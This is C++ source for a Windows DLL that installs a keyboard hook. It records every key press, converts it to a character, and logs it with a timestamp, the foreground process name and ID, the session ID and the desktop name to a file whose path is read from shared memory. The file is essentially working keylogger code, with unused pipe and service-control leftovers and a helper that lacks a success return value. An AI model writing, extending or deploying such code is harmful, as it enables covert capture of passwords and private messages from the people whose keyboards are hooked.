// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>
#include <string>
#include <vector>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <iostream>
#include <stdio.h>
#include <fstream>
#include <thread>
#include <psapi.h> 
HANDLE hPipe;
LPCWSTR pipeName = L"\\\\.\\pipe\\MyNamedPipe";
BOOL ReadStringFromSharedMemoryAndDisplay(std::wstring* source, const std::wstring& key);
std::wstring logFilePath;
std::wofstream logFile;
HINSTANCE hInstance;
HHOOK hHook;
#define CUSTOM_CTRL_CODE 128
#include <ShlObj.h> // Include for SHGetFolderPath function
std::wstring GetDesktopPath() {
	wchar_t path[MAX_PATH];
	if (SHGetFolderPath(nullptr, CSIDL_DESKTOP, nullptr, 0, path) != S_OK) {
		// Handle error if SHGetFolderPath fails
		// For example, throw an exception or return an empty string
		return L"";
	}
	return std::wstring(path);
}
bool PathExists(const std::wstring& path) {
	DWORD attributes = GetFileAttributes(path.c_str());
	if (attributes == INVALID_FILE_ATTRIBUTES) {
		// Handle error or path not found
		return false;
	}
	return true;
}

bool SendCustomControlCode(const std::wstring& serviceName) {
	// Open the Service Control Manager
	SC_HANDLE hSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
	if (hSCManager == nullptr) {
		std::wcerr << L"OpenSCManager failed: " << GetLastError() << std::endl;
		return false;
	}

	// Open the service
	SC_HANDLE hService = OpenService(hSCManager, serviceName.c_str(), SERVICE_USER_DEFINED_CONTROL | SERVICE_QUERY_STATUS);
	if (hService == nullptr) {
		std::wcerr << L"OpenService failed: " << GetLastError() << std::endl;
		CloseServiceHandle(hSCManager);
		return false;
	}

	// Send the custom control code (128)
	SERVICE_STATUS status;
	if (!ControlService(hService, CUSTOM_CTRL_CODE, &status)) {
		std::wcerr << L"ControlService failed: " << GetLastError() << std::endl;
		CloseServiceHandle(hService);
		CloseServiceHandle(hSCManager);
		return false;
	}

	// Clean up
	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);

	return true;
}


std::wstring GetProcessName(DWORD processID) {
	std::wstring processName = L"Unknown";

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	if (hProcess != NULL) {
		HMODULE hMod;
		DWORD cbNeeded;
		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
			wchar_t szProcessName[MAX_PATH];
			if (GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(wchar_t))) {
				processName = szProcessName;
			}
		}
		CloseHandle(hProcess);
	}
	return processName;
}
std::wstring GetDesktopName(DWORD processID) {
	std::wstring desktopName = L"Unknown";

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
	if (hProcess != NULL) {
		// Get the primary thread ID
		DWORD threadID = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
		if (threadID != 0) {
			HDESK hDesk = GetThreadDesktop(threadID);
			if (hDesk != NULL) {
				wchar_t deskName[MAX_PATH];
				DWORD needed;
				if (GetUserObjectInformation(hDesk, UOI_NAME, deskName, sizeof(deskName), &needed)) {
					desktopName = deskName;
				}
			}
		}
		CloseHandle(hProcess);
	}
	return desktopName;
}
std::wstring FormatterString(std::wstring& keyStr) {

	// Get the current time
	auto now = std::chrono::system_clock::now();
	auto in_time_t = std::chrono::system_clock::to_time_t(now);
	auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;

	struct tm timeinfo;
	localtime_s(&timeinfo, &in_time_t);

	std::wstringstream ss;
	ss << std::put_time(&timeinfo, L"%d/%m/%Y %H:%M:%S")
		<< L"." << std::setw(3) << std::setfill(L'0') << ms.count();

	std::wstring timestamp = ss.str();

	HWND hwnd = GetForegroundWindow();
	DWORD processID;
	GetWindowThreadProcessId(hwnd, &processID);
	std::wstring processName = GetProcessName(processID);
	std::wstring desktopName = GetDesktopName(processID);
	DWORD sessionId;
	if (!ProcessIdToSessionId(processID, &sessionId)) {
		sessionId = -1; // If the call fails, set session ID to -1
	}

	// Format the final log string
	std::wstringstream finalLog;
	finalLog << L"['" << keyStr << L"', " << timestamp << L"'( " << "ProceessId: " << processID << L"', " << "ProcessName: " << processName << L"', " << "Session Id: " << sessionId << L"', " << "Desktop Name: " << desktopName << L" ')" << L"]";

	return finalLog.str();
}
extern "C" __declspec(dllexport) LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		// Decode lParam to get key event details
		DWORD vkCode = wParam;
		DWORD scanCode = (lParam >> 16) & 0xFF;
		BOOL extended = (lParam >> 24) & 0x01;
		BOOL previousState = (lParam >> 30) & 0x01;
		BOOL transitionState = (lParam >> 31) & 0x01;

		if ((lParam & 0x80000000) == 0) { // Key press
			
			std::wstringstream keystrokes;
			keystrokes << L"Key press - Key code: " << vkCode << std::endl;
			keystrokes << L"Scan code: " << scanCode << std::endl;
			keystrokes << L"Extended key: " << extended << std::endl;
			keystrokes << L"Previous state: " << previousState << std::endl;
			keystrokes << L"Transition state: " << transitionState << std::endl;

			// Write to log file or output (replace with your logging mechanism)

			wchar_t buffer[5] = { 0 };
			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);
			std::wstringstream key;
			// Translate the virtual key code to a character
			int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);
			if (result > 0) {
			
				key << buffer;
				std::wcout << key.str() << std::endl;
				std::wstring key_str = key.str();
				
				wchar_t key2 = L'K';
				logFile.open(logFilePath, std::ios_base::app);
				logFile << FormatterString(key_str) << std::endl;
				logFile.close();
			}
		}
	}

	// Call the next hook in the chain
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

BOOL StartDll() {
	ReadStringFromSharedMemoryAndDisplay(&logFilePath, L"MySharedMemory");
	return TRUE;
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		hInstance = hModule;
		StartDll();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


// Function to read a string from shared memory and display it in a message box
BOOL ReadStringFromSharedMemoryAndDisplay(std::wstring* source, const std::wstring& key) {
	HANDLE hMapFile = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, key.c_str());
	if (hMapFile == NULL) {
		// Handle error
		return FALSE;
	}

	// Read data from shared memory
	PTCHAR pData = (PTCHAR)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(TCHAR) * MAX_PATH);
	if (pData == NULL) {
		// Handle error
		CloseHandle(hMapFile);
		return FALSE;
	}
	std::wstring dataString(pData);
	*source = dataString;

	// Unmap the view and close handles
	UnmapViewOfFile(pData);
	CloseHandle(hMapFile);
}
